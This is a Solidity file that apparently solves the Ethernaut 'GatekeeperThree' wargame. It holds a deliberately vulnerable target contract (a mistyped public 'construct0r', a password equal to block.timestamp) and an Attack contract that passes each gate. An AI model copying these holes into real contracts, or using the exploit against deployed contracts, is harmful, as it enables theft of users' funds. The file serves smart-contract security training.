// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }
    
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }
    
  function trickInit() public {
    trick = address(this);
  }
    
  // delegate call
  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allowEntrance;

  SimpleTrick public trick;

  // call to become the owner
  function construct0r() public {
      owner = msg.sender;
  }

  // attack contract must be the owner
  modifier gateOne() {
    require(msg.sender == owner); 
    require(tx.origin != owner);
    _;
  }

  // attack contract must successfully call getAllowance() function
  modifier gateTwo() {
    require(allowEntrance == true);
    _;
  }

  // this contract must have more than 0.001 ether and the attack contract must fail while receiving 0.001 ether from this contract
  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  // to pass the condition, should be called at the same transaction where SimpleTrick's been deployed (_password is block.timestamp)
  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allowEntrance = true;
    }
  }

  // required for getAllowance()
  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  // target function
  function enter() public gateOne gateTwo gateThree {
    entrant = tx.origin;
  }

  receive () external payable {}
}

contract Attack {
    constructor(GatekeeperThree _target) payable {
        require(msg.value == 1100000000000000, "not enough msg.value");
        // becoming the owner of _target to pass the gateOne
        _target.construct0r();
        // deploying the trick contract (password is current block.timestamp)
        _target.createTrick();
        // getting permission to pass the gateTwo
        _target.getAllowance(block.timestamp);
        // sending funds to pass the gateThree
        require(payable(address(_target)).send(msg.value), "can't transfer");
    }

    function attack(GatekeeperThree _target) external payable {
        _target.enter();
    }

    // must revert while receiving to pass the gateThree
    receive() external payable {
        revert();
    }
}